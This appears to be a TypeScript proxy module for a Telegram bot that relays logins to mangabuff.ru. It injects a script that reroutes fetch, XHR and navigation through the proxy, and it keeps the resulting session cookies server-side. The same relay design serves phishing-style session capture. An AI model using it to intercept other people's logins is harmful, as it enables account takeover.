import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar, Cookie } from 'tough-cookie';

wrapper(axios);

export const TARGET = 'https://mangabuff.ru';

function patchHtml(html: string, proxyBase: string, userId: string): string {
    const staticBase = proxyBase.replace(`/proxy/${userId}`, `/static/${userId}`);

    const interceptScript = `
    <script>
        // Перехват fetch
        const _originalFetch = window.fetch;
        window.fetch = async function(url, options) {
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            } else if (typeof url === 'string' && url.startsWith('${TARGET}')) {
                url = url.replace('${TARGET}', '${proxyBase}');
            }
            
            const response = await _originalFetch(url, options);
            
            const clone = response.clone();
            clone.json().then(data => {
                if (data && data._proxy_success) {
                    window.__loginSuccess = true;
                }
            }).catch(() => {});
            
            return response;
        };

        // Перехват XHR
        const _originalXHR = window.XMLHttpRequest.prototype.open;
        window.XMLHttpRequest.prototype.open = function(method, url, ...rest) {
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            } else if (typeof url === 'string' && url.startsWith('${TARGET}')) {
                url = url.replace('${TARGET}', '${proxyBase}');
            }
            return _originalXHR.call(this, method, url, ...rest);
        };

        // Перехват навигации через history
        const _pushState = history.pushState.bind(history);
        history.pushState = function(state, title, url) {
            if (window.__loginSuccess) {
                if (window.Telegram && window.Telegram.WebApp) {
                    window.Telegram.WebApp.sendData(JSON.stringify({ success: true }));
                    setTimeout(() => window.Telegram.WebApp.close(), 500);
                } else {
                    document.body.innerHTML = '<p>✅ Авторизация успешна!</p>';
                }
                return;
            }
            if (typeof url === 'string' && url.startsWith('/')) {
                url = '${proxyBase}' + url;
            }
            return _pushState(state, title, url);
        };

        // Перехват location.href через beforeunload
        window.addEventListener('beforeunload', function(e) {
            if (window.__loginSuccess) {
                e.preventDefault();
                if (window.Telegram && window.Telegram.WebApp) {
                    window.Telegram.WebApp.sendData(JSON.stringify({ success: true }));
                    window.Telegram.WebApp.close();
                }
            }
        });
    </script>
    `;

    return (
        html
            .replace('</head>', interceptScript + '</head>')
            // остальные replace остаются как были
            .replace(/href="([^"]*?\.(css|woff2?|ttf)[^"]*)"/g, (match, url) => {
                const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
                return `href="${absolute.replace(TARGET, staticBase)}"`;
            })
            .replace(/src="([^"]*?\.(js|png|jpg|jpeg|gif|svg|webp)[^"]*)"/g, (match, url) => {
                const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
                return `src="${absolute.replace(TARGET, staticBase)}"`;
            })
            .replace(/action="([^"]*?)"/g, (match, url) => {
                if (url.startsWith('http') && !url.startsWith(TARGET)) return match;
                const absolute = url.startsWith('/') ? `${TARGET}${url}` : url;
                return `action="${absolute.replace(TARGET, proxyBase)}"`;
            })
            .replace(/href="(\/[^"]*?)"/g, (match, url) => {
                return `href="${proxyBase}${url}"`;
            })
    );
}

export async function proxyGet(
    path: string,
    proxyBase: string,
    jar: CookieJar,
    userId: string,
): Promise<{ html: string; status: number }> {
    const client = axios.create({ jar, withCredentials: true });

    const response = await client.get(`${TARGET}${path}`, {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            Accept: 'text/html,application/xhtml+xml,*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'identity',
        },
        decompress: true,
        maxRedirects: 5,
    });

    const patched = patchHtml(response.data, proxyBase, userId);
    return { html: patched, status: response.status };
}

export async function proxyPost(
    path: string,
    body: Record<string, string>,
    jar: CookieJar,
): Promise<{ cookies: Cookie[]; redirectUrl: string | null }> {
    const client = axios.create({ jar, withCredentials: true });

    const loginPage = await client.get(`${TARGET}${path}`, {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            Accept: 'text/html,application/xhtml+xml,*/*',
        },
    });

    const csrfMatch = loginPage.data.match(
        /content="([^"]+)"[^>]*name="csrf-token"|name="csrf-token"[^>]*content="([^"]+)"/,
    );
    const csrfToken = csrfMatch ? csrfMatch[1] || csrfMatch[2] : null;
    console.log('CSRF token:', csrfToken);

    const loginResponse = await client.post(
        `${TARGET}${path}`,
        new URLSearchParams(body).toString(),
        {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent':
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
                Referer: `${TARGET}/login`,
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRF-TOKEN': csrfToken ?? '',
                Accept: '*/*',
            },
            maxRedirects: 0,
            validateStatus: (s) => true,
        },
    );

    console.log('Login status:', loginResponse.status);
    console.log('Login response:', JSON.stringify(loginResponse.data));

    const cookies = await jar.getCookies(TARGET);
    console.log(
        'Cookies:',
        cookies.map((c) => c.key),
    );
    return { cookies, redirectUrl: null };
}
